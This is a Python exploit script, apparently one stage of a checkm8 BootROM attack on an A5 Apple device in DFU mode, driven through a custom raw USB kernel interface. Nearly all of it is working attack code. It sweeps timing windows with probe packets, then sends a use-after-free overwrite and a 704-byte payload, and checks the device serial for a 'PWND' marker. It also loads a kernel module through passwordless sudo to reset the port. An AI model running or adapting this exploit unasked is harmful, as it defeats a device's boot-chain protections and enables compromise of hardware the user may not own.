#!/usr/bin/env python3
"""pwn-stage6.py - window sweeper for the poisoned-heap DFU.

Serving windows are rare (~1/8 re-entries) and short; single shots
miss them. Instead: sweep each window with 0x80-class serial GET probes
(same class the feng-shui spray used - extending it is benign), with
0xAA markers and readback after each shot. The first non-AA readback
means the chip's handler is live and serving into OUR buffer - fire
the real sequence immediately:

  crit-IN arm (wLength 0x81, zeros-staged, no status)
  UAF write   (bogus 00/00 wLength 0x40, 0x40xCC + 64B overwrite)
  payload     (DNLOAD wLength 0x2C0, 0x40xCC + 704B payload)
  IOC12 PR -> verify PWND:[checkm8]
"""
import ctypes
import fcntl
import importlib.util
import os
import struct
import subprocess
import sys
import time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOLS = os.path.join(REPO, 'tools')

sp = importlib.util.spec_from_file_location('pwn', os.path.join(TOOLS, 'checkm8-a5-pwn.py'))
P = importlib.util.module_from_spec(sp)
sp.loader.exec_module(P)

IOC_CYC = (1 << 30) | (32 << 16) | (ord('R') << 8) | 5
IOC_STATE = (2 << 30) | (40 << 16) | (ord('R') << 8) | 3
RB_SIZE = 4 + 4 + 0x1000
IOC_RW = (3 << 30) | (RB_SIZE << 16) | (ord('R') << 8) | 7
IOC_PORTRESET = (3 << 30) | (16 << 16) | (ord('R') << 8) | 12

PROBE = bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x80, 0x00])
CRIT  = bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x81, 0x00])
UAF   = bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00])
DNL   = bytes([0x21, 0x01, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x02])


def cyc(fd, setup, data, settle_us=1000):
    arr = (ctypes.c_ubyte * max(len(data), 1)).from_buffer_copy(
        bytes(data) if data else b'\x00')
    txn = struct.pack('<8sIBBHIIQ', bytes(setup), len(data), 1, 1, 0,
                      settle_us, 0, ctypes.addressof(arr))
    try:
        fcntl.ioctl(fd, IOC_CYC, txn, True)
        return 0
    except OSError as e:
        _ = arr
        return -e.errno


def readback(fd, n=16):
    rb = bytearray(RB_SIZE)
    struct.pack_into('<I', rb, 0, n)
    fcntl.ioctl(fd, IOC_RW, rb, True)
    st, = struct.unpack_from('<I', rb, 4)
    return st, bytes(rb[8:8 + n])


def state(fd):
    buf = bytearray(40)
    fcntl.ioctl(fd, IOC_STATE, buf, True)
    return struct.unpack_from('<QIIIIIIII', buf, 0)


def pr_module():
    subprocess.run(['sudo', '-n', 'insmod', '/tmp/raw0rb/raw0reset.ko',
                    'bdf=0000:04:00.4', 'port=5', 'mode=1'],
                   capture_output=True, timeout=20)
    subprocess.run(['sudo', '-n', 'rmmod', 'raw0reset'],
                   capture_output=True, timeout=10)


def fire(fd, payload, overwrite):
    rc = cyc(fd, CRIT, b'\x00' * 0x41)
    st, data = readback(fd, 32)
    print('   ARM crit-IN rc=%d rb=%s' % (rc, data.hex()))
    rc = cyc(fd, UAF, b'\xCC' * 0x40 + overwrite)
    print('   UAF write rc=%d' % rc)
    rc = cyc(fd, DNL, b'\xCC' * 0x40 + payload)
    print('   payload rc=%d' % rc)
    buf = bytearray(struct.pack('<IIII', 1, 0, 0, 0))
    fcntl.ioctl(fd, IOC_PORTRESET, buf, True)
    before, after = struct.unpack_from('<II', buf, 4)
    print('   PR: %08x -> %08x' % (before, after))

    t0 = time.time()
    while time.time() - t0 < 20.0:
        serial = P.sysfs_dfu(timeout=2.0)[1]
        if serial:
            print('   serial: %r' % serial)
            if P.PWN_MARKER in serial:
                return True
            return False
        pr_module()
    print('   no serial in 20s')
    return False


def main():
    payload, overwrite = P.load_payloads('classic')
    print('*** stage6: window sweeper, payload=%d overwrite=%d ***'
          % (len(payload), len(overwrite)))
    fd = os.open('/dev/raw0', os.O_RDWR)

    for r in range(15):
        print('== round %d ==' % r)
        f_pre = state(fd)
        pr_module()
        t0 = time.time()
        fresh = False
        f = f_pre
        while time.time() - t0 < 20.0:
            f = state(fd)
            if f[5] and (f[6] != f_pre[6] or f[7] != f_pre[7] or f[4] != f_pre[4]):
                fresh = True
                break
            time.sleep(0.005)
        if not fresh:
            print('   ring frozen - PR again')
            continue

        # sweep the window
        t0 = time.time()
        shots = 0
        eio = 0
        served = False
        while time.time() - t0 < 4.0:
            rc = cyc(fd, PROBE, b'\xAA' * 0x80)
            if rc == 0:
                shots += 1
                st, data = readback(fd, 16)
                if data != b'\xAA' * 16:
                    served = True
                    print('   SERVED after %d shots: %s' % (shots, data.hex()))
                    break
            else:
                eio += 1
                if eio > 3:
                    break
                time.sleep(0.05)
        if not served:
            print('   window closed silent (%d shots, %d eio)' % (shots, eio))
            continue

        if fire(fd, payload, overwrite):
            print('*** PWNED DFU - host-only checkm8 A5 achieved ***')
            os.close(fd)
            return 0
        print('   fired; not pwned - next round')

    print('exhausted rounds')
    os.close(fd)
    return 2


if __name__ == '__main__':
    sys.exit(main())
